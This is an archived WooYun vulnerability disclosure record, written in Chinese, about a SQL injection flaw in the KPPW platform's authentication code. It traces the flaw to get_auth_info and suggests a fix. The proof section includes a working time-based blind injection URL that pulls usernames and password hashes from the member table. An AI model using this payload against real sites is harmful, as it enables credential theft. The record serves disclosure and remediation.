{"id": 47658, "wybug_id": "wooyun-2014-086886", "wybug_title": "KPPW最新版SQL注入漏洞九(全局问题导致大面积注入及总结)", "wybug_corp": "keke.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-12 15:33", "wybug_open_date": "2015-01-18 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-17：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向公众公开  简要描述： KPPW最新版SQL注入漏洞九，也是全局问题导致的大面积注入，这里申明不是在刷漏洞，因为每一个问题都很严重，都能引发很多问题... 详细说明：  KPPW最新版SQL注入漏洞九，也是全局函数的问题，导致大面积注入...文件/control/user/account_auth.php\nif ($code&&in_array($code,$arrAllowAuth)) {\t$code or $code = $keys ['0']; \t$code or kekezu::show_msg ( $_lang ['param_error'], \"index.php?do=auth\", 3, '', 'warning' );\t$auth_class = \"keke_auth_\" . $code . \"_class\";\t$objAuth = new $auth_class ( $code ); \t$auth_item = $arrAllAuthItems [$code]; \t$auth_dir = $auth_item ['auth_dir']; \t$arrAuthInfo = $objAuth->get_user_auth_info ( $gUid, 0, $intBankAid ); \trequire S_ROOT . \"/auth/$code/control/index.php\";\trequire keke_tpl_class::template ( 'auth/' . $code . '/tpl/' . $_K ['template'] . '/'.$step );\tdie;} else {\t$real_pass = keke_auth_fac_class::auth_check ( 'enterprise', $gUid ) or $real_pass = keke_auth_fac_class::auth_check ( \"realname\", $gUid );\t$arrHasAuthItem = keke_auth_fac_class::get_auth ( $gUserInfo );\t$arrUserAuthInfo = $arrHasAuthItem ['info'];}\n这里包含了/auth/$code/control/index.php文件，这里的code我们设置为email当然code有('realname','enterprise','bank','mobile','email')这五中形式进入/auth/email/control/index.php文件：\ncase \"step3\":\t\t\tif($email_a_id&&$ac=='check_email'){\t\t\t\t$boolAuthRes = $objAuth->audit_auth($active_code,$email_a_id);\t\t\t\theader('location:index.php?do=user&view=account&op=auth&code=email');\t\t\t}\t\t\tif($arrAuthInfo['auth_status']==1){\t\t\t\t$auth_tips ='已通过';\t\t\t\t$auth_style = 'success';\t\t\t}elseif($arrAuthInfo['auth_status']==2){\t\t\t\t$auth_tips ='未通过';\t\t\t\t$auth_style = 'warning';\t\t\t}\t\tbreak;\n第三步验证时，$active_code和$email_a_id参数进入验证函数audit_auth跟进，文件/auth/email/lib/keke_auth_email_class.php\npublic function audit_auth($active_code,$email_a_id){\t\tglobal $_K, $kekezu,$_lang;\t\t$user_info=$kekezu->_userinfo;\t\tif(md5($user_info['uid'].$user_info['username'].$user_info['email'])==$active_code){\t\t\t$arrAuthInfo=$this->get_auth_info($email_a_id);\t\t\tif(empty($arrAuthInfo[0])){\t\t\t\treturn false;\t\t\t}\n这里参数$email_a_id又进入函数get_auth_info跟进，文件/lib/sys/keke_auth_base_class.php\npublic function get_auth_info($auth_ids){\t\tif(isset($auth_ids)){\t\t\tif(!stristr($auth_ids,',')) {\t\t\t \treturn  db_factory::query(sprintf(\" select * from %s where %s = '%s'\",TABLEPRE.$this->_auth_table_name,$this->_primary_key,$auth_ids));\t\t\t}else{\t\t\t\treturn db_factory::query(sprintf(\" select * from %s where %s in (%s) \",TABLEPRE.$this->_auth_table_name,$this->_primary_key,$auth_ids));\t\t\t}\t\t}else{\t\t\treturn array();\t\t}\t}\n到这里，参数$auth_ids = $email_a_id，进入了sql语句但是当$auth_ids有逗号分隔的话，就进入下面那一条语句in ($auth_ids),在整个参数传递的过程中$auth_ids没有过滤，这里也没有加引号保护，导致注入。下面我们来看看任何导致大面积注入问题出在get_auth_info函数，位于文件/lib/sys/keke_auth_base_class.phplib下面的文件都是系统的全局调用文件，这里的keke_auth_base_class.php也是一样，在所有关于认证的功能里面都会调用，如下面四个文件：\n/auth/email/lib/keke_auth_email_class.php/lib/sys/keke_auth_base_class.php/lib/sys/keke_auth_base_class.php/lib/sys/keke_auth_base_class.php\n前面两个就是我们这里的漏洞分析，看看下面连个。\npublic function del_auth($auth_ids,$url=null) {\t\tglobal $_lang;\t\t\t$url =\"index.php?do=auth&view=list&code=\".$this->_auth_code;\t\tis_array($auth_ids) and $ids=implode(\",\",$auth_ids) or $ids=$auth_ids;\t\t$auth_info=$this->get_auth_info($ids);\n以及\npublic function review_auth($auth_ids,$type='pass',$url=null){\t\tglobal $_lang;\t\tglobal $kekezu;\t\tif($url===null){\t\t\t$url = $_SERVER['HTTP_REFERER'];\t\t}\t\t$prom_obj = keke_prom_class::get_instance ();\t\tis_array($auth_ids) and $auth_ids=implode(\",\",$auth_ids);\t\t$auth_info=$this->get_auth_info($auth_ids);\t\t$size=sizeof($auth_info);\n这里是在del_auth和review_auth函数处调用了漏洞函数get_auth_info而且进入这两个函数的参数都是没有处理的，最后都直接进入了sql语句，导致sql注入而且del_auth函数在认证过程中被调用的地方是21处...review_auth函数在认证过程中被调用的地方是17处...所以罪魁祸首get_auth_info函数，可以引发大面积的sql注入问题。总结\n在对kppw的系统进行审核过程中发现，只要是在进入sql语句时，如：in (变量)，这样的sql语句时，大部分是没有出来这里的变量的，都存在注入问题，请厂商好好排查这样的点\n   漏洞证明：  邮件认证时，发送邮件：\n\n成功发送认证邮件后，看看邮箱收到的认证链接：\n\n然后copy认证链接，构造参数email_a_id，注意这里的id后面的一个必须存在的id，如这里的2，构造后请求为：\nhttp://localhost/KPPW2520141118UTF-8/index.php?do=user&view=account&op=auth&code=email&email_a_id=111111,2)+and+1=if(mid((select+concat(username,password)+from+keke_witkey_member+limit+0,1),1,1)=char(97),sleep(5),2)%23&ac=check_email&step=step3&ver=1&active_code=336f044bb5fbdc73ea5617330c715cfc\n这里会演示5秒后返回：\n\n说明这里username+passw的第一个字符为a，继续即可注入出username+password的值sql执行日志：\n\n   修复方案：  在in里面加个单引号即可或者个in里面的参数适用intval   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-18 15:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-12 15:36 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  X总怒刷9蛋    \n     2014-12-12 15:37 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  关注......    \n     2014-12-12 15:40 |    \t\tdiguoji \t\t\t( 普通白帽子  |\t\t\t        Rank:323 漏洞数:79        | 中国吉林长春)\t\t \n  高手时间这么充裕啊     \n     2014-12-12 15:43 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @phith0n 没有你一弹给力。。。    \n     2014-12-12 15:43 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @diguoji 挖漏洞跟时间没关系吧。。。    \n     2014-12-12 16:04 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  x总，霸气    \n     2014-12-12 16:36 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  霸气侧漏。    \n     2014-12-12 17:10 |    \t\tsuperbing \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:29        | 常羡古时儿女怀，嘻戏千山好自在。)\t\t \n  这是要玩死KPPW的节奏哈！这么多    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}